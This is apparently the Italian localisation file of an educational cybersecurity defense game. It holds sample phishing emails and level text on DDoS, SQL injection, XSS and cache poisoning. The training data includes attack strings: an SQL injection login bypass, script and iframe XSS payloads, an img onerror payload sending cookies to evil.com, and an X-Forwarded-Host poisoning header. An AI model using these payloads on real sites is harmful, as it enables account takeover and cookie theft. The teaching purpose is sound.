export const translations = {
  italiano: {
    // Home
    home: {
      title: "CYBERSHIELD\nCOMMAND",
      subtitle: "Interfaccia Avanzata di Difesa Informatica",
      play: "GIOCA",
      continua: "CONTINUA",
      newGame: "NUOVA PARTITA",
      options: "OPZIONI"
    },
    // Level 1: Phishing
    level1: {
      emails: [
        {
          id: 1,
          from: 'security@paypa1.com',
          timestamp: 'Oggi 09:15',
          subject: 'URGENTE: Il tuo account è stato bloccato',
          preview: 'Abbiamo rilevato attività sospette sul tuo account...',
          body: 'Gentile Cliente,\n\nAbbiamo rilevato un accesso non autorizzato al tuo conto PayPal. Per la tua sicurezza, il conto è stato temporaneamente bloccato.\n\nClicca qui per verificare la tua identità e sbloccare il conto: http://paypa1-verify.com/login\n\nSe non agisci entro 24 ore, il conto verrà chiuso permanentemente.\n\nSupporto PayPal',
          explanation: 'PHISHING: Dominio del mittente contraffatto ("paypa1" invece di "paypal"), senso di urgenza ("bloccato", "24 ore"), link verso un dominio non ufficiale.',
          links: ['http://paypa1-verify.com/login']
        },
        {
          id: 2,
          from: 'hr@yourcompany.com',
          timestamp: 'Oggi 10:30',
          subject: 'Aggiornamento policy aziendale',
          preview: 'Si prega di prendere visione del nuovo documento...',
          body: 'Ciao,\n\nIn allegato trovi il documento aggiornato relativo alle nuove policy di smart working, in vigore dal prossimo mese.\n\nPer qualsiasi dubbio contattare l\'ufficio HR.\n\nCordiali saluti,\nHR Team\nYourCompany Inc.',
          attachmentName: 'smart_working_policy_v2.pdf',
          explanation: 'LEGITTIMA: Email interna dal dominio aziendale corretto, tono professionale, allegato PDF (formato sicuro per documenti).'
        },
        {
          id: 3,
          from: 'ceo.urgent123@gmail.com',
          timestamp: 'Oggi 14:55',
          subject: 'Bonifico Urgente',
          preview: 'Ho bisogno che tu effettui questo pagamento immediat...',
          body: 'Ciao,\n\nSono in riunione e non posso parlare al telefono. Ho bisogno che tu disponga subito un bonifico urgente per un nuovo fornitore. È vitale per chiudere l\'accordo oggi.\n\nTi invio i dettagli a breve. Rispondimi appena leggi.\n\nSent from my iPhone',
          explanation: 'PHISHING (CEO Fraud): Il mittente usa un indirizzo Gmail generico invece di quello aziendale, crea forte urgenza e pressione psicologica per bypassare le procedure.'
        },
        {
          id: 4,
          from: 'support@microsoft.com',
          timestamp: 'Oggi 15:20',
          subject: 'Il tuo abbonamento Microsoft 365',
          preview: 'Ricevuta di rinnovo automatico...',
          body: 'Gentile Utente,\n\nIl tuo abbonamento a Microsoft 365 è stato rinnovato automaticamente come previsto. Trovi la ricevuta nel tuo account.\n\nSe hai domande, visita support.microsoft.com\n\nMicrosoft Team',
          explanation: 'LEGITTIMA: Indirizzo mittente ufficiale di Microsoft, nessuna richiesta di dati sensibili o link strani, tono informativo.',
          links: ['https://support.microsoft.com']
        },
        {
          id: 5,
          from: 'vincitore@lotteria-premio.xyz',
          timestamp: 'Oggi 16:45',
          subject: 'HAI VINTO UN IPHONE 15!!!',
          preview: 'Congratulazioni! Sei il visitatore numero 1.000.000...',
          body: 'CONGRATULAZIONI!!!\n\nSei stato estratto come vincitore del nostro premio mensile. Hai vinto un nuovissimo iPhone 15 Pro Max!\n\nScarica il modulo allegato per reclamare il tuo premio entro 1 ora!\n\nClicca qui: http://claim-prize-now.xyz/win',
          attachmentName: 'modulo_vincita.exe',
          explanation: 'PHISHING: L\'offerta è troppo bella per essere vera, il dominio è sospetto (.xyz), l\'allegato è un file eseguibile (.exe) che probabilmente contiene malware.',
          links: ['http://claim-prize-now.xyz/win']
        },
        {
          id: 6,
          from: 'newsletter@tech-news.com',
          timestamp: 'Ieri 18:30',
          subject: 'Le novità tech della settimana',
          preview: 'Ecco cosa è successo nel mondo della tecnologia...',
          body: 'Ciao,\n\nEcco il riassunto settimanale delle notizie tech più importanti:\n\n1. Nuovi processori quantistici annunciati\n2. AI Act approvato in EU\n3. Avanzamenti nella cybersecurity\n\nLeggi tutto sul nostro sito.\n\nTech News Team\nUnsubscribe',
          explanation: 'LEGITTIMA: Tipica newsletter informativa, link coerenti con il brand, nessuna richiesta strana.',
          links: ['https://tech-news.com/weekly']
        }
      ],
      hints: {
        step0: 'Apri ogni email e controlla il mittente. Clicca sull\'indirizzo per vedere il dominio completo. Cerca errori come "paypa1.com" invece di "paypal.com".',
        step1: 'Usa il pulsante "Ispeziona Header" per vedere i dettagli tecnici. SPF e DKIM in "FAIL" indicano che l\'email non è autentica!',
        step2: 'Leggi attentamente il contenuto. Attento a: richieste urgenti, errori grammaticali, richieste di denaro/password, tono sospetto.',
        step3a: '✅ Continua! Classifica ogni email con "Email Sicura" o "Segnala Phishing". Riceverai feedback immediato dopo ogni scelta.',
        step3b: 'Attenzione agli allegati! File .exe è un grande segnale di pericolo. Controlla sempre il dominio del mittente.',
        step3c: 'Stai facendo bene! Ricorda: quando hai dubbi, meglio marcare come phishing che rischiare. Mancano poche email!',
        default: '✅ Continua! Classifica ogni email con "Email Sicura" o "Segnala Phishing". Riceverai feedback immediato dopo ogni scelta. Attenzione agli allegati .exe!'
      },
      browser: {
        paypal: {
          title: 'Sito Ufficiale PayPal',
          urlInfo: 'URL corretto: https://paypal.com',
          ssl: 'Certificato SSL valido ✅'
        },
        google: {
          title: 'Come riconoscere email di phishing',
          dangerTitle: '⚠️ Segnali di pericolo:',
          dangerList: [
            'Mittente sospetto o sconosciuto',
            'Errori ortografici nel dominio',
            'Richieste urgenti di azione',
            'Link che non corrispondono al dominio dichiarato'
          ],
          safeTitle: '✅ Verifica sempre:',
          safeList: [
            'SPF e DKIM negli header',
            'Dominio del mittente',
            'Destinazione dei link'
          ]
        }
      },
      debrief: {
        success: {
          title: 'PHISHING DETECTION ANALYSIS',
          resultExcellent: 'RISULTATO: ECCELLENTE - Perfetta identificazione di tutti gli email di phishing!',
          resultGood: 'RISULTATO: BUONO - Hai identificato correttamente quasi tutti i phishing.',
          resultAcceptable: 'RISULTATO: ACCETTABILE - Hai completato il livello ma con alcuni errori.',
          classified: 'Email classificate:',
          correct: 'Identificazioni corrette:',
          precision: 'Precisione:',
          time: 'Tempo completamento:'
        },
        failure: {
          title: 'PHISHING DETECTION FAILED',
          message: 'Hai commesso troppi errori e perso credibilità presso il team di sicurezza.\n\nRiprova a classificare gli email con più attenzione:\n- Controlla il dominio del mittente\n- Ispeziona gli header SPF e DKIM\n- Verifica i link sospetti'
        }
      }
    },
    // Level 2: DDoS
    level2: {
      hints: {
        step0: 'Il sito aziendale è sotto attacco DDoS! Analizza i log SIEM per identificare gli IP malevoli. Apri il TERMINALE e usa "help" per vedere i comandi disponibili.',
        step1: 'Usa "list-ips" nel terminale per vedere gli IP sospetti. Blocca quelli malevoli con "block <ip>".',
        step2: 'Continua a bloccare gli IP con traffico alto (🔴). Attenzione a non bloccare quelli legittimi (🟢)!',
        step3: 'Quasi fatto! Blocca tutti gli IP malevoli per fermare l\'attacco DDoS.',
        default: 'Blocca tutti gli IP malevoli per completare la missione!'
      },
      logs: {
        flood: 'HTTP flood detected - 500 requests/sec from single source',
        abnormal: 'Abnormal traffic pattern - Repeated GET requests to homepage',
        normal: 'Normal user activity - Page load successful',
        distributed: 'Distributed attack pattern detected - Multiple IPs with similar behavior',
        resource: 'Server resource exhaustion - CPU at 98%, Memory at 95%'
      },
      browser: {
        company: {
          title: 'Sito Aziendale',
          errorTitle: '503 - Service Unavailable',
          errorDesc: 'Il server non può gestire la richiesta al momento.',
          errorDetails: 'Error: Connection timeout\nToo many requests to server',
          restoredTitle: '🎉 Sito ripristinato!',
          restoredDesc: 'L\'attacco DDoS è stato mitigato con successo.\nIl traffico è tornato alla normalità.',
          online: '✓ ONLINE'
        },
        owasp: {
          title: 'OWASP - Attacchi DDoS',
          introTitle: '🎯 Cos\'è un attacco DDoS?',
          introText: 'Distributed Denial of Service: attacco che rende un servizio inutilizzabile sovraccaricandolo con traffico da fonti multiple.',
          indicatorsTitle: '⚠️ Indicatori di DDoS:',
          indicatorsList: [
            'Traffico di rete improvvisamente elevato',
            'Molte richieste da IP diversi ma pattern simile',
            'Server lento o irraggiungibile',
            'CPU/RAM al massimo'
          ],
          mitigationTitle: '✅ Tecniche di mitigazione:',
          mitigationList: [
            'Rate Limiting: Limita richieste per IP',
            'Firewall: Blocca traffico sospetto',
            'IP Blocking: Blocca sorgenti malevole',
            'Traffic Analysis: Identifica pattern anomali'
          ]
        }
      },
      terminal: {
        header: '$ CyberShield Security Terminal - Modulo Mitigazione DDoS',
        help: 'Uso: block <ip>\nEsempio: block 203.0.113.42',
        alreadyBlocked: '[!] IP già bloccato',
        maliciousBlocked: '[✓] IP malevolo bloccato con successo!\n[+] Traffico DDoS ridotto',
        legitimateBlocked: '[✗] ATTENZIONE: Utente legittimo!\n[!] Falso positivo rilevato - Accesso utente negato',
        ipBlocked: '[✓] IP bloccato',
        firewallAlready: '[!] Firewall già attivo',
        firewallEnabled: '[✓] Regole firewall avanzate abilitate\n[+] Pattern di traffico sospetti verranno filtrati',
        rateLimitAlready: '[!] Rate limiting già attivo',
        rateLimitEnabled: '[✓] HTTP rate limiting abilitato\n[+] Massimo 100 richieste/minuto per IP\n[+] Questo riduce significativamente gli attacchi flood!',
        status: {
          header: '=== STATO SICUREZZA ===',
          attackActive: '🔴 ATTIVO',
          attackMitigated: '🟢 MITIGATO',
          traffic: 'Livello Traffico',
          firewall: 'Firewall',
          rateLimit: 'Rate Limiting',
          blocked: 'IP Bloccati',
          correct: 'Blocchi Corretti',
          falsePos: 'Falsi Positivi',
          enabled: '✓ Abilitato',
          disabled: '✗ Disabilitato'
        },
        analyze: {
          header: '=== ANALISI TRAFFICO ===',
          requests: 'Richieste Totali: 12,450/sec (CRITICO)',
          protocol: 'Protocollo: 98% richieste HTTP GET',
          pattern: 'Pattern: Richieste ripetute allo stesso endpoint',
          sources: 'sorgenti ad alto volume rilevate',
          rec: 'Raccomandazione: Bloccare IP malevoli e abilitare rate-limit'
        },
        listIps: {
          header: '=== INDIRIZZI IP SOSPETTI ===',
          highVolume: 'Sorgenti alto volume:',
          normalUsers: 'Utenti normali:'
        }
      },
      debrief: {
        success: {
          title: 'ATTACCO DDOS MITIGATO!',
          message: 'Hai bloccato con successo gli IP malevoli.',
          techniquesTitle: 'TECNICHE DI DIFESA DDOS:',
          techniques: [
            'Rate Limiting: limita le richieste per IP',
            'Firewall avanzato: filtra pattern sospetti',
            'Analisi traffico: identifica anomalie',
            'IP Blocking: blocca sorgenti malevole'
          ],
          conclusion: 'Queste tecniche combinate sono essenziali per proteggere i sistemi da attacchi DDoS.'
        },
        failure: {
          title: 'MISSIONE FALLITA',
          message: 'Il sistema è stato sopraffatto dall\'attacco DDoS.\n\nRiprova bloccando tutti gli IP malevoli prima che il tempo scada.'
        },
        stats: {
          mitigated: 'Traffico mitigato',
          blocked: 'IP malevoli bloccati',
          falsePositives: 'Falsi positivi'
        }
      }
    },
    // Level 3: SQL Injection
    level3: {
      logMessages: {
        loginAttempt: 'Tentativo di login utente - username: john.doe',
        searchQuery: 'Query di ricerca normale - keyword: laptop',
        sqliDetected: "SQL Injection rilevata! Payload: admin' OR '1'='1 -- Accesso concesso a utente non autorizzato."
      },
      hints: {
        step0: "Monitora il SIEM e attendi un alert SQL Injection.",
        step1: "Apri CODE EDITOR e analizza 'login.php' - è vulnerabile a SQL Injection.",
        step2: "La query concatena direttamente input utente. Attaccante usa: admin' OR '1'='1",
        step3: "Usa i PREPARED STATEMENT, compilano la query PRIMA dei dati. Ciò rende SQL injection impossibile.",
        stepCode: "Ecco un esempio di come implementare i PREPARED STATEMENT:\n$query = $db->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$query->bind_param(\"ss\", $username, $password);",
        step4: "Modifica completata! Usa 'test-login' nel TERMINALE."
      },
      terminal: {
        initial: [
          '$ Application Security Terminal v3.0',
          '$ Monitoraggio applicazione web...'
        ],
        alert: [
          '$ ALERT: Vulnerabilità SQL Injection rilevata in login.php',
          '$ AZIONE RICHIESTA: Correggere la query usando prepared statements.'
        ],
        modified: '$ login.php modificato. Pronto per il test.',
        testLogin: {
          testing: '> Test login con payload SQLi...',
          input: "> Input: username=admin' OR '1'='1",
          success: [
            '[SUCCESSO] Input rifiutato - Prepared statement ha protetto la query.',
            '[SUCCESSO] Bypass autenticazione PREVENUTO.',
            '$ MISSIONE COMPIUTA! Vulnerabilità SQL Injection corretta.'
          ],
          fail: [
            '[FALLITO] Accesso non autorizzato concesso! Query ancora vulnerabile.',
            '$ ERRORE: Devi usare prepared statements con binding dei parametri.'
          ]
        },
        analyzeCode: {
          header: '=== ANALISI CODICE: login.php ===',
          vuln: 'Vulnerabilità: SQL INJECTION (Alta Gravità)',
          loc: 'Posizione: funzione authenticate_user()',
          issue: 'Problema: Concatenazione diretta di stringhe nella query SQL',
          vector: "Vettore Attacco: ' OR '1'='1 --",
          rec: 'Raccomandazione: Usa prepared statements con mysqli_prepare()'
        },
        help: "Disponibili: analyze-code, test-login, show-logs",
        notFound: "Comando non trovato:"
      },
      debrief: {
        winTitle: 'VULNERABILITÀ IDENTIFICATA: SQL Injection via String Concatenation.',
        winBody: 'Hai dimostrato come query SQL costruite tramite concatenazione di stringhe sono vulnerabili all\'injection.',
        lesson: 'LEZIONE APPRESA: Usa sempre prepared statements e parametri vincolati per proteggere il database da input malevoli.',
        loss: 'MISSIONE FALLITA. Il database è stato compromesso o troppi errori commessi.'
      }
    },
    // Level 4: XSS Defense
    level4: {
      logMessages: {
        sanitizedFalse: 'Utente john.doe ha pubblicato un commento - Contenuto sanitizzato: false',
        payloadDetected: 'Payload XSS rilevato nel commento: <script>alert("XSS Attack!")</script>',
        blockedScript: 'Input sospetto bloccato: tag <script> rilevato e sanitizzato',
        criticalExec: 'CRITICO: Esecuzione script rilevata nel browser utente - Tentativo furto cookie',
        cspActive: 'Content Security Policy attiva - Script inline bloccati',
        normalActivity: 'Attività utente normale - Commento pubblicato con successo',
        onerrorActive: 'XSS via attributo onerror: <img src="x" onerror="..."> - Sfruttamento attivo',
        sanitizationActive: 'Sanitizzazione HTML attiva - Attributi pericolosi rimossi',
        iframeInjection: 'Iniezione Iframe rilevata: <iframe src="javascript:alert(\'XSS\')"> - Tentativo manipolazione DOM',
        cspBlocked: 'Violazione CSP bloccata - Sorgenti Iframe limitate',
        sessionNormal: 'Attività sessione utente - Nessun comportamento sospetto rilevato',
        multipleAttempts: 'Tentativi XSS multipli dallo stesso IP - Pattern attacco confermato',
        allSanitized: 'Tutti gli input utente sanitizzati - Protezione XSS completamente attiva'
      },
      browser: {
        portal: {
          title: 'Portale Dipendenti',
          header: 'Portale Dipendenti Aziendale',
          vulnerable: '⚠️ VULNERABILE',
          secure: '✅ SICURO',
          warningTitle: '⚠️ AVVISO DI SICUREZZA',
          warningText: 'Vulnerabilità XSS rilevate! L\'input utente non è sanitizzato.',
          warningRisk: 'Rischio: Furto cookie, session hijacking, redirect malevoli',
          secureTitle: '✅ MODALITÀ SICURA',
          secureText: 'Sanitizzazione input attiva. Content Security Policy applicata.',
          secureProt: 'Protezione: Escaping HTML, Header CSP, Cookie HttpOnly',
          blockedLabel: '🛡️ BLOCCATO',
          xssLabel: '🚨 XSS',
          scriptWarning: '⚠️ Questo script verrebbe eseguito in un browser reale!',
          addComment: 'Aggiungi Commento',
          placeholder: 'Condividi i tuoi pensieri...',
          postBtn: 'Pubblica',
          comments: [
            { id: 1, text: 'Ottimo articolo! Grazie per la condivisione.' },
            { id: 2, text: 'Post molto informativo, attendo altri contenuti.' },
            { id: 3, text: '<script>alert("Attacco XSS!")</script>Questo è un commento di prova' },
            { id: 4, text: 'Ho una domanda sui dettagli di implementazione.' },
            { id: 5, text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">' },
            { id: 6, text: '<iframe src="javascript:alert(\'XSS\')">' }
          ]
        },
        dashboard: {
          title: 'Dashboard Sicurezza Web',
          protections: {
            title: '🛡️ Protezioni Attive',
            html: 'Sanitizzazione HTML',
            csp: 'Content Security Policy (CSP)',
            escaping: 'Output Escaping',
            httpOnly: 'Cookie HttpOnly',
            enabled: '✅ ABILITATO',
            disabled: '❌ DISABILITATO'
          },
          risk: {
            title: '📊 Analisi Rischio XSS',
            level: 'Livello Rischio Globale',
            critical: 'CRITICO',
            low: 'BASSO',
            payloads: 'Payload XSS Rilevati:',
            execution: 'Esecuzione Script:',
            active: 'ATTIVA ⚠️',
            blocked: 'BLOCCATA ✅',
            userData: 'Dati Utente a Rischio:',
            yes: 'SÌ (Cookie, Sessioni)',
            no: 'NO'
          }
        }
      },
      terminal: {
        initial: [
          '$ Web Security Terminal v4.0',
          '$ Digita "help" per i comandi disponibili',
          '$ ⚠️  ATTENZIONE: Vulnerabilità XSS rilevate nel portale dipendenti!'
        ],
        analyze: {
          header: '=== ANALISI COMMENTI ===',
          total: 'Totale commenti:',
          safe: 'Commenti sicuri:',
          suspicious: 'Commenti sospetti:',
          patterns: 'Pattern XSS rilevati:',
          action: '⚠️ Azione richiesta: Abilita sanitizzazione input!'
        },
        payload: {
          usage: 'Uso: show-payload <comment_id>\nEsempio: show-payload 3',
          safe: 'Il commento è sicuro - nessun XSS rilevato',
          header: '=== ANALISI PAYLOAD XSS ===',
          vector: 'Vettore Attacco:',
          risk: 'Rischio:',
          critical: 'CRITICO - Lo script può essere eseguito!',
          mitigated: 'MITIGATO - Payload bloccato'
        },
        identify: {
          header: '=== IDENTIFICAZIONE TIPO XSS ===',
          type: 'Tipo: STORED XSS (XSS Persistente)',
          desc: 'Descrizione: Script malevoli salvati nel database',
          loc: 'Posizione: Commenti utenti nel forum',
          impact: 'Impatto: Colpisce tutti gli utenti che visualizzano la pagina',
          flow: 'Flusso Attacco:\n1. Attaccante pubblica commento con tag <script>\n2. Script salvato nel database\n3. Script eseguito per ogni utente che visualizza',
          success: '✓ Tipo XSS identificato con successo!'
        },
        enableSanitization: {
          already: '[!] Sanitizzazione HTML già abilitata',
          success: '[✓] Sanitizzazione HTML abilitata\n[+] Tag pericolosi rimossi: <script>, <iframe>, <object>\n[+] Event handlers rimossi: onclick, onerror, onload\n[+] Rischio XSS: SIGNIFICATIVAMENTE RIDOTTO'
        },
        enableCsp: {
          already: '[!] CSP già abilitata',
          success: '[✓] Content Security Policy (CSP) abilitata\n[+] Script inline bloccati\n[+] Unsafe-eval disabilitata\n[+] Frame-ancestors ristretti\n[+] Rischio XSS: RIDOTTO'
        },
        enableEscaping: {
          already: '[!] Output escaping già abilitato',
          success: '[✓] Output escaping abilitato\n[+] Entità HTML escaped: < diventa &lt;, > diventa &gt;\n[+] Previene esecuzione script nel contenuto renderizzato\n[+] Rischio XSS: ELIMINATO per contenuto escaped'
        },
        enableHttpOnly: {
          already: '[!] Cookie HttpOnly già abilitati',
          success: '[✓] Cookie HttpOnly abilitati\n[+] Cookie inaccessibili a JavaScript\n[+] Previene furto cookie via XSS\n[+] Rischio hijacking sessione: RIDOTTO'
        },
        restart: {
          reqBoth: '[!] Abilita almeno sanitization e httponly cookies prima di riavviare.',
          reqSanitization: '[!] Manca la sanitization. Usa enable-sanitization prima.',
          reqHttpOnly: '[!] Manca httponly cookies. Usa enable-httponly prima.',
          success: '[✓] Applicazione riavviata\n[✓] Configurazioni sicurezza applicate\n[✓] Sanitizzazione HTML: ATTIVA\n[✓] Cookie HttpOnly: ATTIVI\n[✓] Attacco XSS mitigato con successo!'
        },
        scan: {
          header: '=== SCANSIONE VULNERABILITÀ ===',
          found: 'VULNERABILITÀ TROVATE:',
          none: '✓ Nessuna vulnerabilità critica rilevata',
          recs: 'Raccomandazioni:\n1. Abilita sanitizzazione HTML (CRITICO)\n2. Implementa Content Security Policy (ALTO)\n3. Abilita output escaping (ALTO)\n4. Imposta flag HttpOnly sui cookie (MEDIO)',
          missingSanitization: '- Nessuna sanitizzazione input',
          missingCsp: '- Content Security Policy mancante',
          missingEscaping: '- Nessun output escaping',
          missingHttpOnly: '- Cookie accessibili agli script'
        },
        status: {
          header: '=== STATO SICUREZZA ===',
          active: 'Attacco XSS Attivo:',
          execution: 'Esecuzione Script:',
          app: 'Stato App:',
          identified: 'Tipo XSS Identificato:',
          protections: 'Protezioni Attive:',
          yes: '🔴 SÌ',
          no: '🟢 NO',
          activeState: '🔴 ATTIVA',
          blockedState: '🟢 BLOCCATA',
          restarted: 'RIAVVIATA',
          running: 'IN ESECUZIONE',
          notYet: 'NON ANCORA'
        },
        help: "Disponibili: analyze-comments, show-payload <id>, identify-xss, enable-sanitization, enable-csp, enable-escaping, enable-httponly, scan-vulnerabilities, restart-app",
        notFound: "Comando non trovato:"
      },
      hints: {
        step0: 'Il portale aziendale mostra comportamenti anomali. Controlla i commenti nel BROWSER per capire cosa sta succedendo.',
        step1: 'Alcuni commenti sembrano contenere codice. Nel TERMINALE usa "help" per vedere i comandi disponibili.',
        step2: 'Gli attacchi XSS sfruttano input non sanitizzati. Analizza i log SIEM per vedere i pattern di attacco.',
        step3: 'Per proteggere i cookie da JavaScript, considera le impostazioni HttpOnly. Per bloccare tag pericolosi, usa la sanitization.',
        step4: 'Dopo aver attivato le protezioni necessarie, ricorda di riavviare l\'applicazione per applicarle.'
      },
      debrief: {
        winTitle: 'ATTACCO XSS MITIGATO!',
        winBody: 'Hai protetto con successo il portale dipendenti dagli attacchi Cross-Site Scripting.',
        techniquesTitle: 'TECNICHE UTILIZZATE:',
        techniques: [
          'Sanitizzazione Input: rimuove codice malevolo',
          'HttpOnly Cookies: previene furto di sessione',
          'CSP: limita le sorgenti di esecuzione script',
          'Output Escaping: converte caratteri speciali'
        ]
      }
    },
    // Level 5: Cache Poisoning
    level5: {
      logMessages: {
        cacheMiss: 'Cache MISS - Contenuto fresco servito dall\'origine',
        suspiciousReq: 'Richiesta sospetta rilevata - X-Forwarded-Host: evil.com',
        reqValidated: 'Richiesta validata - Nessun header sospetto rilevato',
        cacheHitPoisoned: 'Cache HIT - Risposta cachata con header X-Forwarded-Host malevolo',
        cacheConfigured: 'Cache configurata correttamente - Contenuto dinamico non cachato',
        criticalHit: 'CRITICO: Utente legittimo ha ricevuto contenuto avvelenato dalla cache (Cache HIT)',
        safeContent: 'Utente ha ricevuto contenuto fresco e sicuro dal server di origine',
        normalBrowsing: 'Richiesta pagina normale - Utente naviga il sito',
        cachePollution: 'Inquinamento Cache rilevato - Stessa cache key serve contenuto diverso',
        varyConfigured: 'Header Vary configurato - La cache key corretta include tutti gli header sensibili',
        consistentContent: 'Cache serve contenuto coerente',
        keyCollision: 'Collisione cache key - Richieste multiple mappate sulla stessa entry cache',
        keyCorrect: 'Cache key include correttamente header Host e X-Forwarded-Host',
        multipleAffected: 'Utenti multipli colpiti - Entry cache avvelenata servita 234 volte',
        normalOps: 'Cache operativa normalmente - Nessun avvelenamento rilevato'
      },
      browser: {
        site: {
          title: 'Sito Aziendale',
          alert: '⚠️ ALERT: Contenuto malevolo iniettato dalla cache!',
          malicious: 'Questo contenuto è stato servito dalla cache con modifiche malevole',
          headers: 'Header Risposta HTTP:',
          hitWarning: '⚠️ Cache HIT - Servito dalla cache (234 volte)',
          secure: '✓ SICURO',
          purged: '✅ Cache svuotata e riconfigurata\n✅ Contenuto fresco servito dal server di origine',
          missSuccess: '✓ Cache MISS - Contenuto fresco dall\'origine'
        },
        profile: {
          title: 'Profilo Utente',
          warning: '⚠️ Attenzione: Questo contenuto personalizzato viene servito dalla cache condivisa!',
          hitWarning: '⚠️ Cache HIT - Dati utente privati serviti dalla cache pubblica (89 hits)',
          headerError: 'Cache-Control: public, max-age=3600 ❌ (Dovrebbe essere private o no-store!)',
          freshSuccess: '✅ Contenuto personalizzato servito fresco dal server di origine',
          missSuccess: '✓ Cache MISS - Contenuto dinamico non cachato',
          headerSuccess: 'Cache-Control: no-store, must-revalidate ✅'
        },
        owasp: {
          title: '🛡️ Cache Poisoning - Guida OWASP',
          whatTitle: '🎯 Cos\'è Cache Poisoning?',
          whatText: 'Attacco che inserisce contenuto malevolo nella cache HTTP condivisa. Il contenuto avvelenato viene servito a tutti gli utenti che accedono alla risorsa cacheata.',
          howTitle: '⚠️ Come funziona:',
          howList: [
            'Attaccante invia richiesta con header modificati (es: X-Forwarded-Host)',
            'Server risponde includendo header nella risposta',
            'Risposta viene cacheata con cache key inadeguata',
            'Utenti legittimi ricevono la risposta avvelenata dalla cache'
          ],
          keyTitle: '🔑 Cache Key:',
          keyText: 'La cache key determina quale risposta viene servita. Se non include header sensibili (Host, Cookie, ecc.), risposte diverse possono essere servite dalla stessa entry in cache.',
          prevTitle: '✅ Prevenzione:',
          prevList: [
            '<strong>Vary header:</strong> Include header sensibili nella cache key',
            '<strong>Cache-Control:</strong> no-store per contenuti dinamici',
            '<strong>Validazione input:</strong> Non fidarsi di header client',
            '<strong>Cache key corretta:</strong> Include Host, Cookie, etc.'
          ]
        }
      },
      terminal: {
        initial: [
          '$ Terminale Gestione Reverse Proxy v1.0',
          '$ Digita "help" per i comandi disponibili',
          '$ ⚠️  ATTENZIONE: Cache poisoning rilevato - Contenuto malevolo nella cache!'
        ],
        showCache: {
          empty: '[✓] La cache è vuota',
          header: '=== ENTRY CACHE ===',
          path: 'Path:',
          status: 'Stato:',
          hits: 'Cache Hits:',
          cachedAt: 'Cachato il:',
          xCache: 'X-Cache:'
        },
        purgeCache: {
          alreadyEmpty: '[!] La cache è già vuota',
          success: '[✓] Cache svuotata con successo\n[+] Tutte le entry cachate rimosse\n[+] Le prossime richieste recupereranno contenuto fresco dall\'origine\n[!] Ricorda di correggere la configurazione della cache per prevenire nuovo avvelenamento!'
        },
        showHeaders: {
          header: '=== HEADER RISPOSTA HTTP ===',
          current: 'Configurazione attuale:',
          ccPublic: 'public, max-age=3600 ❌',
          ccPrivate: 'no-store, must-revalidate ✅',
          probPublic: 'Contenuto dinamico viene cachato pubblicamente',
          probPrivate: 'Previene correttamente il caching di contenuto dinamico',
          varyMissing: '<non impostato> ❌',
          varySet: 'Host, X-Forwarded-Host, Cookie ✅',
          probVaryMissing: 'Cache key non include header sensibili',
          probVarySet: 'Cache key include correttamente header sensibili',
          xfhEvil: 'evil.com ❌',
          xfhSanitized: '<sanitizzato> ✅',
          probXfhEvil: 'Header non fidato usato nella cache key',
          probXfhSanitized: 'Header validato correttamente'
        },
        identifyHeader: {
          success: '=== ANALISI HEADER ===\nVettore avvelenamento identificato: X-Forwarded-Host\n\nCome funziona:\n1. Attaccante invia: X-Forwarded-Host: evil.com\n2. Server usa questo header per generare risposta\n3. Risposta viene cachata con cache key errata\n4. Tutti gli utenti ricevono la risposta avvelenata\n\nCausa radice: Cache key non include X-Forwarded-Host\nSoluzione: Aggiungi header "Vary: X-Forwarded-Host"\n\n✓ Vettore attacco identificato con successo!'
        },
        fixCacheKey: {
          already: '[!] Cache key già configurata correttamente',
          success: '[✓] Configurazione cache key aggiornata\n[+] Cache key ora include: URL + Host + X-Forwarded-Host + Cookie\n[+] Previene collisioni cache da richieste diverse\n[+] Ogni richiesta unica ottiene la propria entry cache'
        },
        setCacheControl: {
          usage: 'Uso: set-cache-control no-store',
          already: '[!] Cache-Control è già impostato a no-store',
          success: '[✓] Header Cache-Control aggiornato\n[+] Impostato a: no-store, must-revalidate\n[+] Contenuto dinamico/personalizzato non sarà cachato\n[+] Solo asset statici saranno cachati'
        },
        enableVaryHeader: {
          already: '[!] Header Vary già abilitato',
          success: '[✓] Header Vary abilitato\n[+] Impostato a: Vary: Host, X-Forwarded-Host, Cookie\n[+] Cache key ora include questi header\n[+] Previene cache poisoning via manipolazione header'
        },
        restartProxy: {
          reqPurge: '[!] Per favore svuota la cache prima di riavviare',
          reqFix: '[!] Per favore correggi la configurazione header prima di riavviare',
          success: '[✓] Reverse proxy riavviato\n[✓] Nuova configurazione applicata',
          cacheClean: 'PULITA',
          cacheDirty: 'NECESSITA PULIZIA',
          headersSecure: 'SICURA',
          headersCheck: 'CONTROLLA CONFIG',
          mitigated: '[✓] Cache poisoning mitigato con successo!',
          vulnerable: '[!] Sistema ancora vulnerabile'
        },
        status: {
          header: '=== STATO SICUREZZA CACHE ===',
          poisoned: 'Cache Avvelenata:',
          entries: 'Entry Cache:',
          cleared: 'Cache Svuotata:',
          headersFixed: 'Header Corretti:',
          vary: 'Vary Header:',
          keyFixed: 'Cache Key Corretta:',
          noCache: 'No-Cache Dinamico:',
          identified: 'Header Identificato:',
          restarted: 'Proxy Riavviato:',
          yes: '🔴 SÌ',
          no: '🟢 NO'
        },
        help: "Disponibili: show-cache, purge-cache, show-headers, identify-header, fix-cache-key, set-cache-control no-store, enable-vary-header, restart-proxy, status",
        notFound: "Comando non trovato:"
      },
      hints: {
        step0: 'Nel SIEM analizza i log e cerca "Cache HIT" con contenuti anomali. Nel TERMINALE usa "show-cache" per vedere cosa è stato memorizzato in cache.',
        step1: 'La cache è svuotata! Nel TERMINALE identifica l\'header responsabile con "identify-header" e analizza come il proxy sta cachando i contenuti.',
        step2: 'Nel TERMINALE abilita "Vary" header con "enable-vary-header" e usa "set-cache-control no-store" per i contenuti dinamici. Poi riavvia il proxy.',
        step3: 'Nel TERMINALE usa "restart-proxy" per applicare tutte le modifiche di sicurezza. Verifica con "status" che le protezioni siano attive.',
        step4: {
          a: 'Stai quasi terminando! Nel TERMINALE usa "status" per verificare che tutte le protezioni siano attive.',
          b: 'Ricorda: il Vary header deve includere Host e X-Forwarded-Host per evitare che diverse versioni vengano cachate insieme.',
          c: 'Ultimo passo! Nel TERMINALE assicurati che il proxy sia riavviato con "restart-proxy" e che la cache sia pulita con "show-cache".'
        },
        default: 'Nel TERMINALE usa "status" per verificare che tutte le protezioni siano attive!'
      },
      debrief: {
        title: 'ANALISI DIFESA CACHE POISONING',
        cleared: 'Cache svuotata:',
        fixed: 'Header corretti:',
